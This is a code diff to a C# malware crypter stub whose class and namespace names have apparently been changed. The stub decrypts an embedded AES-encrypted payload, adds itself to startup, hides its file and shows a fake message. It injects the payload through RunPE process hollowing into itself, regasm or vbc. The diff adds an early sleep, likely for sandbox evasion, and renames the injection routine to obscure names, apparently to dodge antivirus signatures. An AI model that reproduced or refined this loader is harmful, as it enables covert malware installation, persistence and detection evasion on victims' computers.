@@ -29,6 +29,8 @@ namespace stupidcancercodeisruiningeverything
         [STAThread]
         static void Main()
         {
+			//Basic delay
+            Thread.Sleep([delay-replace] * 100);
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             Application.Run(new FrmOne());
@@ -46,6 +48,7 @@ namespace stupidcancercodeisruiningeverything
             byte[] bytes = (byte[])manager.GetObject("encfile");
             return bytes;
         }
+		
     }
 
     public class FrmOne : Form
@@ -71,8 +74,7 @@ namespace stupidcancercodeisruiningeverything
         {
 
             InitializeComponent();
-			//Basic delay
-            Thread.Sleep([delay-replace] * 100);
+			
 			//Giving a byte array for our encrypted bytes
             byte[] fBytes = Reader.ReadManaged();
 			//The encryption key
@@ -88,19 +90,24 @@ namespace stupidcancercodeisruiningeverything
 			//The all decrypted bytes
 			byte[] eBytes2 = Convert.FromBase64String(result);
 			//If user choosed startup add to startup
+			
             if (_startup)
                 AddToStartup();
 			//Make the file hidden
             HideFile();
+			
             Thread.Sleep(500);
-
+			
             //Use the runpe to inject the decrypted bytes into a process of our injection method choice
             if(injectTo == "[itself]")
-            RunPe1.Run(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName,"",eBytes2);
+            KillerMemestart.FMEMES(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName,"",eBytes2);
+
             if(injectTo =="[regasm]")
-            RunPe1.Run(injectionPath2, "", eBytes2);
+            KillerMemestart.FMEMES(injectionPath2, "", eBytes2);
+
             if(injectTo == "[vbc]")
-            RunPe1.Run(injectionPath3, "", eBytes2);
+            KillerMemestart.FMEMES(injectionPath3, "", eBytes2);
+
 			//Fake Message
 			if(_fakemessage)
 			{
@@ -109,7 +116,8 @@ namespace stupidcancercodeisruiningeverything
 			//Stopping the program because runpe is already injected
             Environment.Exit(0);
         }
-
+		
+        
         //Decryption method
 		public static byte[] AESDecrypt(byte[] decrypted, byte[] key2)
         {
@@ -146,8 +154,7 @@ namespace stupidcancercodeisruiningeverything
 			
             string path = Path.Combine(Application.UserAppDataPath, "[fname-replace]");
             string path2 = Path.Combine(path, "[finame-replace].exe");
-			//string pathreg = Path.Combine(Application.UserAppDataPath,"[regfname-replace]");
-			//string pathreg2 = Path.Combine(pathreg,"[regfiname-replace].exe");
+			
 			if (!File.Exists(path2))
             {
                 DirectoryInfo di = Directory.CreateDirectory(path);
@@ -164,11 +171,12 @@ namespace stupidcancercodeisruiningeverything
             f.Attributes = FileAttributes.Hidden;
         }
 		
+		
     }
 
     
 
-    static class RunPe1
+    static class KillerMemestart
     {
 
         [DllImport("kernel32.dll", EntryPoint = "CreateProcess", CharSet = CharSet.Unicode)]
@@ -219,7 +227,7 @@ namespace stupidcancercodeisruiningeverything
             private readonly IntPtr StdOutput;
             private readonly IntPtr StdError;
         }
-        public static bool Run(string path, string cmd, byte[] data)
+        public static bool FMEMES(string path, string cmd, byte[] data)
         {
 
             int readWrite = 0;
